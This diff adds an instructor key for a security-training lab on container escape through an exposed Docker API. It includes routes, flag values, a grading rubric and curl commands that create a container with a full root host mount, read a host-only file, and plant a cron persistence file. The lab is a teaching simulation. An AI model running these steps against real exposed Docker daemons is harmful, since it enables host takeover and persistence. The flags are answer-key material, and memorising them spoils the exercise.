@@ -1,0 +1,109 @@
+# Module 5 — Lab 3: Container/Cluster Escape & Lateral Movement — Instructor Key
+
+> **⚠️ PLANNED CONTENT — not yet built.** Build spec, implementation-ready. Depends
+> on Module 5 Lab 2's `soulsecure-internal-svc-role` and bastion proxy. Flag values
+> below are placeholders generated at planning time.
+
+## New asset: `docker-proxy` container
+
+Docker-internal name only, reachable exclusively via `bastion`'s `/proxy` route
+(same network as `internal-svc` from Lab 2). Implements a **simplified subset** of
+the real Docker Engine HTTP API (port 2375 convention, matching real Docker's
+unencrypted-socket-over-TCP default). Auth: requires
+`X-Access-Key-Id`/`X-Secret-Access-Key` headers matching
+`soulsecure-internal-svc-role`'s credentials from Lab 2 (checked independently by
+`docker-proxy` itself, same self-contained pattern as `storage_app.py`'s auth check
+— not a call out to `iam-sim`).
+
+## Routes (ground truth)
+
+| Method | Path | Behavior |
+|---|---|---|
+| GET | `/v1.41/containers/json` | Returns a canned list of ~9 containers (the real internal inventory: `www`, `api`, `storage`, `jenkins-old`, `iam-sim`, `bastion`, `internal-svc`, `docker-proxy` itself, `backup-eu`/`vpn` if separate containers). The `docker-proxy` entry's `Labels` field includes `{"flag": "flag{328eabb244a10c29a66df568dd066ab9}"}` |
+| POST | `/v1.41/containers/create` | Body `{"Image":..., "Cmd":[...], "HostConfig":{"Binds":[...]}}`. If `Binds` includes an entry matching `/:/host` (any mode), stores a new container record with a generated `Id`, marks it `privileged_host_mount: true`. Response: `{"Id": "<generated>"}` |
+| POST | `/v1.41/containers/<id>/start` | If the container was created with the host-mount bind: response `{"status":"started","flag":"flag{cab288312382b1a7d0294645aa360e97}"}`. Otherwise just `{"status":"started"}`, no flag (didn't actually achieve escape-capable mount) |
+| POST | `/v1.41/containers/<id>/exec` | Body `{"Cmd":[...]}`. Only meaningful against a `privileged_host_mount` container. Stores the command, returns `{"Id": "<exec-id>"}` |
+| POST | `/v1.41/exec/<exec-id>/start` | Pattern-matches the stored `Cmd`: if it contains `cat` + `/host/opt/soulsecure-labs/HOST-SECRET.txt`, returns that file's canned content + `flag{d4e90ea050335b467c43e1c69546d9c9}`; if it contains a write to `/host/etc/cron.d/soulsecure-persist`, records that write server-side and returns success (no flag on this call — see `/host-check/cron`) |
+| GET | `/host-check/cron` | Returns `{"cron_persisted": true/false}` based on whether the cron-write exec above happened; if true, also `"flag":"flag{97d00066d487c67fcc100bb04e50ef29}"` |
+
+## `HOST-SECRET.txt` contents (canned)
+
+```
+This file only exists on the host filesystem, outside any container.
+If you can read this, your container escape actually reached the host.
+flag{d4e90ea050335b467c43e1c69546d9c9}
+```
+
+## Flags (ground truth — placeholder values, see banner)
+
+| Flag | Location | Value |
+|---|---|---|
+| Flag 1 | `/v1.41/containers/json`, `docker-proxy` container's `Labels` | `flag{328eabb244a10c29a66df568dd066ab9}` |
+| Flag 2 | `/v1.41/containers/<id>/start` for a host-mounted container | `flag{cab288312382b1a7d0294645aa360e97}` |
+| Flag 3 | `/v1.41/exec/<id>/start` reading `HOST-SECRET.txt` | `flag{d4e90ea050335b467c43e1c69546d9c9}` |
+| Flag 4 (harder mode) | `/host-check/cron` after writing the persistence file | `flag{97d00066d487c67fcc100bb04e50ef29}` |
+
+## Verification commands (once built, all wrapped through the bastion proxy)
+
+```bash
+BASE="https://bastion.soulsecure.lab/proxy?url=http://docker-proxy:2375"
+HDRS=(-H "X-SSH-Key-Fingerprint: $FP" -H "X-Access-Key-Id: ASIAINTERNALSVC04" -H "X-Secret-Access-Key: <secret>")
+
+curl -sk "${HDRS[@]}" "$BASE/v1.41/containers/json"                                    # Flag 1
+
+curl -sk "${HDRS[@]}" -X POST "$BASE/v1.41/containers/create" \
+  -H 'Content-Type: application/json' \
+  -d '{"Image":"alpine:latest","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}'
+curl -sk "${HDRS[@]}" -X POST "$BASE/v1.41/containers/<id>/start"                       # Flag 2
+
+curl -sk "${HDRS[@]}" -X POST "$BASE/v1.41/containers/<id>/exec" \
+  -H 'Content-Type: application/json' -d '{"Cmd":["cat","/host/opt/soulsecure-labs/HOST-SECRET.txt"]}'
+curl -sk "${HDRS[@]}" -X POST "$BASE/v1.41/exec/<exec-id>/start"                        # Flag 3
+
+curl -sk "${HDRS[@]}" -X POST "$BASE/v1.41/containers/<id>/exec" \
+  -H 'Content-Type: application/json' \
+  -d '{"Cmd":["sh","-c","echo x > /host/etc/cron.d/soulsecure-persist"]}'
+curl -sk "${HDRS[@]}" -X POST "$BASE/v1.41/exec/<exec-id2>/start"
+curl -sk "${HDRS[@]}" "$BASE/host-check/cron"                                           # Flag 4
+```
+
+## Grading rubric (out of 100, proposed)
+
+| Criterion | Points |
+|---|---|
+| Enumerated containers and found the label flag | 10 |
+| Created a container with a correct full-root host mount | 20 |
+| Correctly explained why `Binds: ["/:/host"]` specifically (not a narrower mount) demonstrates full impact | 10 |
+| Successfully read a host-only file via `exec` | 25 |
+| Successfully wrote a persistent host-level file via `exec` and confirmed it | 25 |
+| Clean impact summary correctly framing this as host-level, not container-level, compromise | 10 |
+
+## Design notes / narrative threads
+
+- This lab is the most infrastructure-heavy addition in Module 5 (per the open
+  design question flagged in [Module5-Overview.md](../Module5-Overview.md)) — kept
+  deliberately scoped to a **simplified subset** of the Docker API rather than a
+  general-purpose showcase, exactly per that overview's resolution.
+- The container-inventory reveal (Flag 1) doubles as a "here's everything running in
+  this environment" moment — useful for instructor debrief even outside the
+  container-escape technique itself.
+- Read (Flag 3) vs. write (Flag 4) is a deliberate two-stage escalation of impact
+  within one technique, mirroring Module 3 Lab 3's read-vs-write-proof structure on
+  Jenkins' `/userContent/` — consistent pedagogical pattern across the course.
+
+## File locations (proposed)
+
+- `/opt/soulsecure-labs/apps/docker_proxy_sim.py` (new) — in-memory container/exec
+  state, the route table above. Keep genuinely isolated (its own container, own
+  network) so a bug here can't actually touch the real Docker host running the lab
+  stack — this is a **simulation** of Docker socket exposure, not real socket access,
+  and must never be implemented by literally mounting the actual host's
+  `/var/run/docker.sock` into anything reachable by students.
+
+## Known limitations
+
+Simplified Docker Engine API subset — no image pulling, no real container runtime
+underneath, no real filesystem access (all file reads/writes are pattern-matched and
+canned). **Critical build-time safety note:** this must be a pure simulation with no
+actual privileged Docker access granted to the `docker-proxy` container itself —
+see File locations above.
